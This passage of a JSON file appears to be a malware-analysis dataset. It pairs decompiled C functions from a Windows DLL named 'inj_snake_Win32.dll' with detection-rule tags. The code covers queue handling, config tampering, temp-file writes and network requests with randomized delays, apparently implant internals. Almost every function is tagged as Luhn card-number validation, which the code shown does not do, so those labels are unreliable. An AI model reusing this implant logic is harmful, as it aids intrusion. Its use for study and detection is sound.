        "decompiled_code": "\nuint32_t __cdecl fcn.20008ae0(int32_t size, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t arg_ch_00;\n    ushort *s2;\n    ushort *arg_14h;\n    ushort var_48h;\n    uint var_46h;\n    int32_t ptr;\n    \n    uVar1 = (*_sym.imp.ntdll.dll_strtoul)(size + 1, 0, 0);\n    iVar2 = sym.inj_snake_Win32.dll_local_queue_read(3, uVar1, 0, 0, &size, 0);\n    if (iVar2 == 0) {\n        ptr = (*_sym.imp.msvcrt.dll_malloc)(size);\n        if (ptr == 0) {\n            uVar3 = 0x21590004;\n        }\n        else {\n            iVar4 = sym.inj_snake_Win32.dll_local_queue_read(3, uVar1, ptr, size, &size, 0);\n            iVar2 = arg_ch;\n            if (iVar4 == 0) {\n                var_48h = 0x26;\n                (*_sym.imp.ntdll.dll__itow)(uVar1, &var_46h, 10);\n                iVar4 = iVar2 + 4;\n                s2 = &var_48h;\n                *(iVar2 + 0x118) = 1;\n                arg_ch_00 = ptr;\n                arg_14h = s2;\n                uVar1 = fcn.20008999();\n                uVar3 = fcn.20010268(uVar1, arg_ch_00, s2, arg_14h, iVar4);\n            }\n            else {\n                uVar3 = iVar4 + 0x191U | 0x21590000;\n            }\n            (*_sym.imp.msvcrt.dll_free)(ptr);\n            uVar1 = fcn.20008999();\n            *(iVar2 + 0x11c) = uVar1;\n            if (uVar3 != 0) {\n                *(iVar2 + 4) = 0;\n            }\n        }\n    }\n    else {\n        uVar3 = iVar2 + 0x191U | 0x21590000;\n    }\n    return uVar3;\n}\n",
        "token_count": 521
    },
    "20008ef2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20008ef2(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    iVar1 = fcn.2000d5bb(arg_10h, 0x11, 2, &var_4h, 4);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    uVar2 = fcn.20006a7e(0xfffffffe, 4, var_4h + 1);\n    return uVar2;\n}\n",
        "token_count": 144
    },
    "2000902f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2000902f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_40h;\n    uint var_3ch;\n    \n    iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 7, &arg_8h, &var_40h);\n    if (iVar1 == 0) {\n        sym.inj_snake_Win32.dll_qm_set_param(0xfffffffe, 7, var_3ch, 2, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 130
    },
    "2000934c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000934c(uint noname_0, uint noname_1, uint noname_2, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    iVar1 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 7, &var_4h, &arg_14h);\n    if (iVar1 != 0) {\n        return iVar1 + 0x191U | 0x21590000;\n    }\n    sym.inj_snake_Win32.dll_qm_rm_list(arg_14h, var_4h);\n    sym.inj_snake_Win32.dll_qm_free(arg_14h);\n    return 0;\n}\n",
        "token_count": 178
    },
    "20009394": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.20009394(void)\n\n{\n    uint *puVar1;\n    \n    fcn.20001a1f(0x20046ddc);\n    while( true ) {\n        puVar1 = **0x20046e14;\n        if (puVar1 == NULL) break;\n        **0x20046e14 = *puVar1;\n        fcn.20001a68(0x20046ddc);\n        if (puVar1[0x44] != NULL) {\n            (*puVar1[0x44])();\n        }\n        fcn.200089de(puVar1);\n        (*_sym.imp.msvcrt.dll_free)(puVar1);\n        fcn.20001a1f(0x20046ddc);\n    }\n    fcn.20001a68(0x20046ddc);\n    fcn.20001a1f(0x20046ddc);\n    **0x20046e14 = 0;\n    *0x20046e14 = NULL;\n    *0x20046e10 = 0;\n    fcn.20001a68(0x20046ddc);\n    fcn.20001953(0x20046ddc);\n    if (*0x200473a4 != *0x20046e18) {\n        fcn.2000899e(*0x200473a4, 0x200474b4);\n    }\n    if (*0x20046cb4 != 0) {\n        fcn.20001a1f(0x20047180);\n        fcn.200089de(0x20046cb0);\n        *0x20046cb4 = 0;\n        *0x20046e1c = 0;\n        *0x20046e20 = 0;\n        fcn.20001a68(0x20047180);\n    }\n    fcn.20001953(0x20047180);\n    return;\n}\n",
        "token_count": 431
    },
    "20009713": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20009713(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_108h;\n    uint var_4h;\n    \n    iVar1 = fcn.2000d580(arg_10h, 3, 4, &var_4h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    fcn.20001e44(var_4h, &var_108h, 0x104, 0x200471e0);\n    uVar2 = fcn.2000946a(&var_108h, 0);\n    return uVar2;\n}\n",
        "token_count": 169
    },
    "20009768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20009768(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_108h;\n    uint var_4h;\n    \n    iVar1 = fcn.2000d580(arg_10h, 3, 4, &var_4h, 0);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    fcn.20001e44(var_4h, &var_108h, 0x104, 0x200471e0);\n    uVar2 = fcn.2000968a(&var_108h);\n    return uVar2;\n}\n",
        "token_count": 166
    },
    "20009845": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20009845(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint var_110h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.2000d580(arg_10h, 4, 5, &var_4h, &var_ch);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    iVar1 = fcn.2000d580(arg_10h, 0x36, 4, &var_8h, 0);\n    if (iVar1 == 0) {\n        return 0x21590066;\n    }\n    fcn.20001e44(var_8h, &var_110h, 0x104, 0x200471e0);\n    uVar2 = fcn.2000946a(&var_110h, var_4h);\n    return uVar2;\n}\n",
        "token_count": 238
    },
    "200098bd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.200098bd(void)\n\n{\n    int32_t iVar1;\n    uint var_10ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    iVar1 = sym.inj_snake_Win32.dll_config_read(0x22a, &var_10ch, 0x104, &var_8h);\n    if (iVar1 == 0) {\n        fcn.20001a1f(0x20047180);\n        var_4h = 1;\n        if (*0x20046cb4 != 0) {\n            fcn.200089de(0x20046cb0);\n            *0x20046e1c = 0;\n            *0x20046e20 = 0;\n        }\n        if (var_10ch == '&') {\n            iVar1 = fcn.20008ae0(&var_10ch, 0x20046cb0);\n        }\n        else {\n            iVar1 = fcn.20008a53(0x20046cb0, &var_10ch);\n        }\n        if (((iVar1 == 0) && (iVar1 = fcn.2000896f(0x20046cb0, \"compress\", 0x20046e1c),  iVar1 == 0)) &&\n           (iVar1 = fcn.2000896f(0x20046cb0, \"compressBound\", 0x20046e20),  iVar1 == 0)) {\n            fcn.200089b0(*0x20046cb4, 0x20046dc4);\n            iVar1 = 0;\n            goto code_r0x20009911;\n        }\n    }\n    else {\n        iVar1 = 0x21590065;\n    }\n    *0x20046e1c = 0;\n    *0x20046e20 = 0;\n    fcn.200089de(0x20046cb0);\n    if (var_4h == 0) {\n        return iVar1;\n    }\ncode_r0x20009911:\n    fcn.20001a68(0x20047180);\n    return iVar1;\n}\n",
        "token_count": 498
    },
    "200099ca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.200099ca(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_108h;\n    uint var_4h;\n    \n    fcn.20001911(0x20046ddc);\n    *0x20046e18 = fcn.2000894b();\n    *0x20046e14 = 0x200473a0;\n    *0x20046e10 = 0x200473a0;\n    if (*0x200473a4 != *0x20046e18) {\n        fcn.200089b0(*0x200473a4, 0x200474b4);\n    }\n    fcn.20001911(0x20047180);\n    fcn.200098bd(0, 0, 0, 0, 0, 0, 0);\n    iVar2 = 500;\n    do {\n        iVar1 = sym.inj_snake_Win32.dll_config_read(iVar2, &var_108h, 0x104, &var_4h);\n        if ((iVar1 == 0) && (var_108h != '\\0')) {\n            sym.inj_snake_Win32.dll_config_write(iVar2, \"-crash-\", 8);\n            iVar1 = fcn.2000946a(&var_108h, 0);\n            (*_sym.imp.KERNEL32.dll_Sleep)(2000);\n            sym.inj_snake_Win32.dll_config_write(iVar2, &var_108h, var_4h);\n            if ((iVar1 != 0) && (iVar1 != 0x21590206)) {\n                sym.inj_snake_Win32.dll_snake_log(0xd, iVar1, 0, 0, 0xbb9aca00);\n            }\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x227);\n    return;\n}\n",
        "token_count": 439
    },
    "20009e43": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20009e43(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    var_4h = 0;\n    fcn.20001567(0x20046e28);\n    puVar1 = *0x20046e24;\n    do {\n        if (puVar1 == NULL) {\ncode_r0x20009e8f:\n            fcn.2000157d(0x20046e28);\n            return var_4h;\n        }\n        uVar3 = 0;\n        if (puVar1[3] != 0) {\n            piVar2 = puVar1 + 4;\n            do {\n                if (*piVar2 == arg_8h) {\n                    var_4h = 1;\n                    goto code_r0x20009e8f;\n                }\n                uVar3 = uVar3 + 1;\n                piVar2 = piVar2 + 3;\n            } while (uVar3 < puVar1[3]);\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 267
    },
    "20009e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.20009e9c(int32_t arg_8h, uint noname_1, uint arg_10h, uint32_t arg_14h, uint noname_4, uint noname_5, \n            int32_t arg_20h)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint32_t var_20h;\n    uint var_10h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    bVar1 = false;\n    if (arg_20h == 0) {\n        var_8h = 0x21590064;\n    }\n    else if (arg_14h < 0x10) {\n        var_8h = 0x215901f8;\n    }\n    else {\n        var_10h = 0;\n        sub.ntdll.dll_memcpy(&var_20h, arg_10h, 0x10);\n        var_20h = (*_sym.imp.WS2_32.dll_ntohl)(var_20h);\n        (*_sym.imp.WS2_32.dll_htonl)(var_20h);\n        fcn.20001567(0x20046e28);\n        var_4h = 0;\n        for (puVar6 = *0x20046e24; puVar6 != NULL; puVar6 = *puVar6) {\n            uVar7 = 0;\n            if (puVar6[3] != 0) {\n                piVar3 = puVar6 + 5;\n                do {\n                    if ((piVar3[-1] == var_20h) && (*piVar3 == 0)) {\n                        var_4h = puVar6[2];\n                        iVar4 = fcn.20012290(arg_8h);\n                        if (iVar4 != 0) {\n                            fcn.2000157d(0x20046e28);\n                            return iVar4;\n                        }\n                        puVar6[uVar7 * 3 + 5] = arg_8h;\n                        puVar6[(uVar7 + 2) * 3] = var_10h;\n                        bVar1 = true;\n                        goto code_r0x20009f2f;\n                    }\n                    uVar7 = uVar7 + 1;\n                    piVar3 = piVar3 + 3;\n                } while (uVar7 < puVar6[3]);\n            }\n        }\ncode_r0x20009f2f:\n        fcn.2000157d(0x20046e28);\n        if (bVar1) {\n            var_8h = sym.inj_snake_Win32.dll_tr_write_pipe(var_4h);\n            pcVar2 = _sym.imp.KERNEL32.dll_GetTickCount;\n            if (var_8h == 0) {\n                var_4h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n                iVar4 = fcn.200018bf();\n                while( true ) {\n                    do {\n                        iVar5 = fcn.20013a3e(var_10h, 3);\n                        if (iVar5 == 0) goto code_r0x2000a02a;\n                        iVar5 = fcn.200122d6(arg_8h);\n                        if (iVar5 != 0) goto code_r0x2000a01d;\n                        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n                        iVar5 = (*pcVar2)();\n                    } while (iVar5 - var_4h < iVar4 % 0x83d61 + 60000U);\n                    var_8h = fcn.200122f4(arg_8h);\n                    if (var_8h != 0) break;\n                    var_4h = (*pcVar2)();\n                    iVar4 = fcn.200018bf();\n                }\n            }\ncode_r0x2000a01d:\n            sym.inj_snake_Win32.dll_t_close(&var_10h, 0);\ncode_r0x2000a02a:\n            fcn.20001567(0x20046e28);\n            iVar4 = 0;\n            for (puVar6 = *0x20046e24; puVar6 != NULL; puVar6 = *puVar6) {\n                uVar7 = 0;\n                if (puVar6[3] != 0) {\n                    piVar3 = puVar6 + 5;\n                    do {\n                        if ((piVar3[-1] == var_20h) && (*piVar3 == arg_8h)) {\n                            *piVar3 = 0;\n                            piVar3[1] = 0;\n                            iVar4 = puVar6[2];\n                        }\n                        uVar7 = uVar7 + 1;\n                        piVar3 = piVar3 + 3;\n                    } while (uVar7 < puVar6[3]);\n                }\n            }\n            fcn.2000157d(0x20046e28);\n            if (iVar4 != 0) {\n                (*_sym.imp.WS2_32.dll_htonl)(var_20h | 0x80000000);\n                sym.inj_snake_Win32.dll_tr_write_pipe(iVar4);\n            }\n        }\n        else {\n            var_8h = 0x21590005;\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 1214
    },
    "2000a0a7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.2000a0a7(int32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.20001567(0x20046e28);\n    puVar1 = *0x20046e24;\n    do {\n        if (puVar1 == NULL) {\ncode_r0x2000a0fc:\n            fcn.2000157d(0x20046e28);\n            return var_4h;\n        }\n        uVar2 = 0;\n        if (puVar1[3] != 0) {\n            piVar3 = puVar1 + 4;\n            do {\n                if (*piVar3 == arg_8h) {\n                    var_4h = puVar1[(uVar2 + 2) * 3];\n                    if (var_4h != 0) goto code_r0x2000a0fc;\n                    break;\n                }\n                uVar2 = uVar2 + 1;\n                piVar3 = piVar3 + 3;\n            } while (uVar2 < puVar1[3]);\n        }\n        puVar1 = *puVar1;\n    } while( true );\n}\n",
        "token_count": 298
    },
    "2000a109": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.2000a109(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint s;\n    uint32_t var_34h;\n    uint var_30h;\n    uint var_2bh;\n    uint32_t var_23h;\n    code *var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_23h = sym.inj_snake_Win32.dll_config_read_uint32(1, 0);\n    sub.ntdll.dll_memset(&s, 0, 0x25);\n    pcVar1 = _sym.imp.WS2_32.dll_htonl;\n    var_34h = var_23h | 0x80000000;\n    var_30h._0_1_ = 1;\n    s = (*_sym.imp.WS2_32.dll_htonl)(s);\n    var_34h = (*pcVar1)(var_34h);\n    var_2bh = (*pcVar1)(var_2bh);\n    var_23h = (*pcVar1)(var_23h);\n    iVar2 = sym.inj_snake_Win32.dll_tc_send_request(arg_8h, 4, &s, 0x25, &var_4h, 0);\n    if (iVar2 == 0) {\n        sub.ntdll.dll_memset(&var_10h, 0, 0xc);\n        var_8h = var_4h;\n        var_10h = fcn.200045f1;\n        iVar2 = sym.inj_snake_Win32.dll_t_setoptbin(arg_8h, 0xf, &var_10h, 0xc, 0);\n        if (iVar2 != 0) {\n            sym.inj_snake_Win32.dll_snake_log(2, 0, iVar2, 4, 0);\n            sym.inj_snake_Win32.dll_tc_cancel(arg_8h, var_4h);\n        }\n    }\n    else {\n        sym.inj_snake_Win32.dll_snake_log(2, 0, iVar2, 4, 0);\n    }\n    return;\n}\n",
        "token_count": 496
    },
    "2000a1df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000a1df(uint arg_8h, uint filename)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t s1;\n    uint32_t uVar3;\n    int32_t stream;\n    int32_t nitems;\n    \n    s1 = 0;\n    stream = 0;\n    iVar1 = sym.inj_snake_Win32.dll_local_queue_read(3, arg_8h, 0, 0, &nitems, 0);\n    if (iVar1 == 0) {\n        s1 = (*_sym.imp.msvcrt.dll_malloc)(nitems);\n        if (s1 == 0) {\n            uVar3 = 0x21590004;\n            goto code_r0x2000a288;\n        }\n        iVar1 = sym.inj_snake_Win32.dll_local_queue_read(3, arg_8h, s1, nitems, &nitems, 0);\n        if (iVar1 == 0) {\n            *_sym.imp.msvcrt.dll__fmode = 0x8000;\n            stream = (*_sym.imp.msvcrt.dll_fopen)(filename, 0x2002d4d4);\n            if (stream != 0) {\n                iVar1 = (*_sym.imp.msvcrt.dll_fwrite)(s1, 1, nitems, stream);\n                if (iVar1 == nitems) {\n                    uVar3 = 0;\n                    goto code_r0x2000a288;\n                }\n            }\n            puVar2 = (*_sym.imp.msvcrt.dll__errno)();\n            uVar3 = *puVar2;\n            goto code_r0x2000a288;\n        }\n    }\n    uVar3 = iVar1 + 0x191U | 0x21590000;\ncode_r0x2000a288:\n    (*_sym.imp.msvcrt.dll_free)(s1);\n    if (stream != 0) {\n        (*_sym.imp.msvcrt.dll_fclose)(stream);\n    }\n    return uVar3;\n}\n",
        "token_count": 457
    },
    "2000a70f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000a70f(uint arg_8h, int32_t arg_ch, uint32_t arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *arg_18h_00;\n    uint arg_1ch;\n    uint var_158h;\n    uint var_54h;\n    int32_t s;\n    uint32_t var_4ch;\n    uint var_48h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    \n    fcn.20001567(0x20046e40);\n    iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 8, &arg_8h, &var_40h);\n    iVar2 = arg_ch;\n    if (iVar1 == 0) {\n        if (((arg_10h != 1) || (var_2ch != 1)) ||\n           ((var_30h != arg_ch && (((var_30h != 0 && (var_24h != arg_ch)) && (var_24h != 0)))))) {\n            uVar3 = 0x21590064;\n            goto code_r0x2000a912;\n        }\n        iVar1 = sym.inj_snake_Win32.dll_local_queue_read(var_38h, var_3ch, arg_18h, 0x104, &var_54h, 1);\n        if (iVar1 == 0) {\n            var_28h = var_28h + 1;\n            iVar1 = sym.inj_snake_Win32.dll_qm_set_param(var_40h, var_38h, var_3ch, 2, var_28h);\n            if (iVar1 == 0) {\n                if (iVar2 != 0) {\n                    if (var_30h == 0) {\n                        var_30h = iVar2;\n                        uVar4 = 0;\n                    }\n                    else {\n                        if (var_24h != 0) goto code_r0x2000a7df;\n                        var_24h = iVar2;\n                        uVar4 = 3;\n                    }\n                    iVar1 = sym.inj_snake_Win32.dll_qm_set_param(var_40h, var_38h, var_3ch, uVar4, iVar2);\n                    if (iVar1 != 0) goto code_r0x2000a7e6;\n                }\ncode_r0x2000a7df:\n                uVar3 = 0;\n                goto code_r0x2000a912;\n            }\n        }\ncode_r0x2000a7e6:\n        uVar3 = iVar1 + 0x191U | 0x21590000;\n        goto code_r0x2000a912;\n    }\n    uVar3 = 0;\n    if (*0x20046c18 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetTempPathA)(0x104, &var_158h);\n        if (iVar2 != 0) goto code_r0x2000a847;\ncode_r0x2000a821:\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        if (arg_10h == 1) {\n            fcn.20009b95();\n        }\n        else {\n            fcn.20009b6f(&var_158h, 0x104);\n        }\ncode_r0x2000a847:\n        uVar4 = arg_18h;\n        if (arg_14h == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetTempFileNameA)(&var_158h, 0x2002d620, 0, arg_18h);\n            if (iVar2 == 0) goto code_r0x2000a821;\n        }\n        else {\n            fcn.200088de(\"%s%s\", &var_158h);\n        }\n        sub.ntdll.dll_memset(&s, 0, 0x10);\n        s = arg_ch;\n        var_4ch = arg_10h;\n        arg_1ch = 1;\n        arg_18h_00 = &s;\n        var_48h = 1;\n        iVar2 = sub.ntdll.dll_strlen(uVar4);\n        iVar2 = sym.inj_snake_Win32.dll_local_queue_write(8, arg_8h, uVar4, iVar2 + 1, arg_18h_00, arg_1ch);\n        if (iVar2 == 0) {\n            if (((arg_10h & 1) == 0) || (uVar3 = fcn.2000a1df(arg_8h, uVar4),  uVar3 == 0)) goto code_r0x2000a912;\n            iVar2 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 8, &arg_8h, &var_40h);\n            if (iVar2 == 0) {\n                sym.inj_snake_Win32.dll_qm_rm(var_40h, var_38h, var_3ch);\n            }\n        }\n        else {\n            uVar3 = iVar2 + 0x191U | 0x21590000;\n        }\n        (*_sym.imp.msvcrt.dll__unlink)(uVar4);\n    }\ncode_r0x2000a912:\n    fcn.2000157d(0x20046e40);\n    return uVar3;\n}\n",
        "token_count": 1291
    },
    "2000a9d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2000a9d9(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint arg_14h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    fcn.20001567(0x20046e40);\n    iVar1 = sym.inj_snake_Win32.dll_qm_enum(0xfffffffe, 8, &var_ch, &var_4h);\n    if ((iVar1 == 0) && (var_8h = 0,  var_ch != 0)) {\n        iVar1 = 0;\n        do {\n            puVar2 = var_4h + iVar1;\n            if (puVar2[4] == arg_8h) {\ncode_r0x2000aa2b:\n                arg_14h = 0;\ncode_r0x2000aa32:\n                sym.inj_snake_Win32.dll_qm_set_param(*puVar2, puVar2[2], puVar2[1], arg_14h, 0);\n                fcn.2000a924(*(iVar1 + 0xc + var_4h));\n            }\n            else if (puVar2[7] == arg_8h) {\n                if (puVar2[4] == arg_8h) goto code_r0x2000aa2b;\n                arg_14h = 3;\n                goto code_r0x2000aa32;\n            }\n            var_8h = var_8h + 1;\n            iVar1 = iVar1 + 0x40;\n        } while (var_8h < var_ch);\n    }\n    fcn.2000157d(0x20046e40);\n    sym.inj_snake_Win32.dll_qm_free(var_4h);\n    return;\n}\n",
        "token_count": 426
    },
    "2000aaf9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.2000aaf9(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h, int32_t *arg_18h, int32_t *arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint *arg_14h_00;\n    uint var_214h;\n    uint var_110h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    *arg_14h = 2;\n    iVar3 = fcn.2000d5bb(arg_10h, 0x21, 2, &var_4h, 4);\n    if (iVar3 == 0) {\n        return 0x21590065;\n    }\n    iVar3 = fcn.2000d5bb(arg_10h, 0x22, 3, &var_ch, 4);\n    if (iVar3 != 0) {\n        arg_14h = NULL;\n        fcn.2000d580(arg_10h, 3, 4, &arg_14h, 0);\n        if (arg_14h == NULL) {\n            arg_14h_00 = NULL;\n        }\n        else {\n            fcn.20001e44(arg_14h, &var_214h, 0x104, 0x200471e0);\n            arg_14h_00 = &var_214h;\n        }\n        var_8h = fcn.2000a70f(var_4h, 0, var_ch, arg_14h_00, &var_110h);\n        if (var_8h == 0) {\n            iVar3 = sub.ntdll.dll_strlen(&var_110h);\n            piVar2 = arg_1ch;\n            *arg_1ch = iVar3 * 2;\n            iVar3 = (*_sym.imp.msvcrt.dll_malloc)(iVar3 * 2 + 2);\n            piVar1 = arg_18h;\n            *arg_18h = iVar3;\n            if (iVar3 == 0) {\n                *piVar2 = 0;\n                fcn.2000a924(var_4h);\n                var_8h = 0x21590004;\n            }\n            else {\n                fcn.20001d99(&var_110h, iVar3, 0xffffffff, 0x200471e0);\n                iVar3 = (*_sym.imp.ntdll.dll_wcslen)(*piVar1);\n                *piVar2 = iVar3 * 2;\n            }\n        }\n        else {\n            *arg_18h = 0;\n            *arg_1ch = 0;\n        }\n        return var_8h;\n    }\n    return 0x21590066;\n}\n",
        "token_count": 635
    },
    "2000ac1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2000ac1c(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    \n    *arg_14h = 0;\n    iVar1 = fcn.2000d5bb(arg_10h, 0x21, 2, &arg_14h, 4);\n    if (iVar1 == 0) {\n        return 0x21590065;\n    }\n    fcn.2000a924(arg_14h);\n    return 0;\n}\n",
        "token_count": 130
    },
    "2000ae9e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.2000ae9e(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.20001d41(0x20046e60);\n    if (iVar1 != 0) {\n        *0x20046e5c = 1;\n        fcn.200012c9(0x20047170);\n        fcn.20001d55(0x20046e60, 0);\n        fcn.20001d2f(0x20046e60);\n    }\n    fcn.200012a9(0x20047170);\n    return;\n}\n",
        "token_count": 135
    },
    "2000b272": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.2000b272(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_40h;\n    uint var_3ch;\n    \n    *arg_14h = 0;\n    iVar1 = fcn.2000d5bb(arg_10h, 9, 2, &arg_14h, 4);\n    if (iVar1 == 0) {\n        iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 6, 0, &var_40h);\n        while (iVar1 == 0) {\n            sym.inj_snake_Win32.dll_qm_rm(0xfffffffe, 6, var_3ch);\n            iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 6, 0, &var_40h);\n        }\n    }\n    else {\n        iVar1 = sym.inj_snake_Win32.dll_qm_find_first(0xfffffffe, 6, &arg_14h, &var_40h);\n        if ((iVar1 != 0) || (iVar1 = sym.inj_snake_Win32.dll_qm_rm(0xfffffffe, 6, var_3ch),  iVar1 != 0)) {\n            return iVar1 + 0x191U | 0x21590000;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 336
    },
    "2000b306": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
